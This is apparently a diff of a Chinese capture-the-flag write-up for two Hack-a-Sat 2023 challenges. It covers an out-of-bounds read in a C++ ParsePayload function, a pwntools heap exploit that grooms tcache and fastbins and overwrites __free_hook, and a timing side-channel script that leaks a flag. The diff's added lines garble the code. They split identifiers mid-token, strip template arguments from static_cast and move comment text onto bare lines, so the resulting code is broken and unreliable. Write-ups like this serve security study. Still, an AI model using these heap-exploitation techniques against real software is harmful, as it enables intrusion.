@@ -25,7 +25,9 @@ Don’t trust me? Fine. You’re more than welcome to test my spacebus implement
 
 在程序解析十六进制消息时，会将2个字符解析为一个字节中的十六进制数，如果输入的字符数量为奇数，节点中设置信息时CalcPayloadLen函数会保存原来的长度，在读取信息时会根据节点中保存的长度输出内存中的数据，可以越界读。
 
-SB_Msg* SB_Pipe::ParsePayload(const std::string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
+SB_Msg* SB_Pipe::
+ParsePayload(const std::
+string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
 if(s.length() == 0){
 return nullptr;
 }
@@ -38,12 +40,13 @@ char cur_byte[3] = {0};
 for(size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++){
 cur_byte[0] = s[i];
 cur_byte[1] = s[i+1];
-msg_s[j] = static_cast<uint8_t>(std::strtol(cur_byte, nullptr, 16));
+msg_s[j] = static_cast(std::
+strtol(cur_byte, nullptr, 16));
 }
 }
 else{
 for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){
-msg_s[i] = static_cast<uint8_t>(s[i]);
+msg_s[i] = static_cast(s[i]);
 }
 }
 
@@ -196,8 +199,10 @@ for i in range(9):
 handle1()
 for i in range(10):
 handle0()
-#tcache:abbbbbb
-#fastbin:bbbb...
+#tcache:
+abbbbbb
+#fastbin:
+bbbb...
 #h0:
 #h1:a
 
@@ -207,8 +212,10 @@ post(101, 1, 0, '2'*0x68)
 post(101, 0, 0, '2'*0x68)
 post(101, 0, 0, '2'*0x68)
 #tcache:
-#fastbin:bbbb...
-#h0:bbbbbbbb
+#fastbin:
+bbbb...
+#h0:
+bbbbbbbb
 #h1:aa
 
 for i in range(7):
@@ -216,8 +223,10 @@ handle0()
 handle1()
 handle0()
 handle1()
-#tcache:bbbbbbb
-#fastbin:ababbbb...
+#tcache:
+bbbbbbb
+#fastbin:
+ababbbb...
 #h0:
 #h1:
 
@@ -390,12 +399,9 @@ https://bbs.kanxue.com/user-home-869963.htm
 ```
 一
 Magic Space Bussin
-```
-
-
-
-```
-SB_Msg* SB_Pipe::ParsePayload(const std::string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
+SB_Msg* SB_Pipe::
+ParsePayload(const std::
+string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
 if(s.length() == 0){
 return nullptr;
 }
@@ -408,12 +414,13 @@ char cur_byte[3] = {0};
 for(size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++){
 cur_byte[0] = s[i];
 cur_byte[1] = s[i+1];
-msg_s[j] = static_cast<uint8_t>(std::strtol(cur_byte, nullptr, 16));
+msg_s[j] = static_cast(std::
+strtol(cur_byte, nullptr, 16));
 }
 }
 else{
 for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){
-msg_s[i] = static_cast<uint8_t>(s[i]);
+msg_s[i] = static_cast(s[i]);
 }
 }
 
@@ -426,11 +433,6 @@ CalcPayloadLen(ishex, s)
 
 return payload;
 }
-```
-
-
-
-```
 if(payload->pipe_id == UINT8_MAX){
 if(this->msg_id_pipe_lens[payload->msg_id] <= this->msg_max_subs){
 bool copy = true;
@@ -460,11 +462,6 @@ LOG_ERR("Too many pipes subscribed to Msg ID: %d. Bailing out...n", payload->msg
 exit(-1);
 }
 }
-```
-
-
-
-```
 #!/usr/bin/python3
 
 from pwn import *
@@ -568,30 +565,36 @@ for i in range(9):
 handle1()
 for i in range(10):
 handle0()
-#tcache:abbbbbb
-#fastbin:bbbb...
-#h0:
-#h1:a
+    #tcache:
+abbbbbb
+    #fastbin:
+bbbb...
+    #h0:
+    #h1:a
 
 for i in range(6):
 post(101, 0, 0, '2'*0x68)
 post(101, 1, 0, '2'*0x68)
 post(101, 0, 0, '2'*0x68)
 post(101, 0, 0, '2'*0x68)
-#tcache:
-#fastbin:bbbb...
-#h0:bbbbbbbb
-#h1:aa
+    #tcache:
+    #fastbin:
+bbbb...
+    #h0:
+bbbbbbbb
+    #h1:aa
 
 for i in range(7):
 handle0()
 handle1()
 handle0()
 handle1()
-#tcache:bbbbbbb
-#fastbin:ababbbb...
-#h0:
-#h1:
+    #tcache:
+bbbbbbb
+    #fastbin:
+ababbbb...
+    #h0:
+    #h1:
 
 free_hook = libc.symbols['__free_hook']+libcbase
 log.info(hex(free_hook))
@@ -611,18 +614,8 @@ return ''
 if __name__ == "__main__":
 
 flag = exp('magic.quals2023-kah5Aiv9.satellitesabove.me', 5300)
-```
-
-
-
-```
 二
 Spectrel Imaging
-```
-
-
-
-```
 Scheduler {
 int fd; // 0 /fpga/spectral
 uint64_t padding; // 8
@@ -634,11 +627,6 @@ char padding[0x10];
 char seq[0x100]; // 0x1F416
 char flag[]; // 0x1F516
 }
-```
-
-
-
-```
 def emit_check(char_idx, char_val):
 s = ""
 for _ in range(0, 3):
@@ -657,11 +645,6 @@ with open("submission", "w") as f:
 for i in range(0, 120):
 for j in range(0x20, 0x7f):
 f.write(emit_check(i, j))
-```
-
-
-
-```
 repeat = 3
 l = 120
 
@@ -679,11 +662,6 @@ time.append(s/repeat)
 
 flag += chr(32+time.index(min(time)))
 print(flag)
-```
-
-
-
-```
 $ python3 test.py
 flag{ThisIsNotARealFlagButYouCanUseItToTest!!!!}hR^hL[Q=G9*?T4)hry&]dbqX,[q6l[.IDNg-qV
 ```
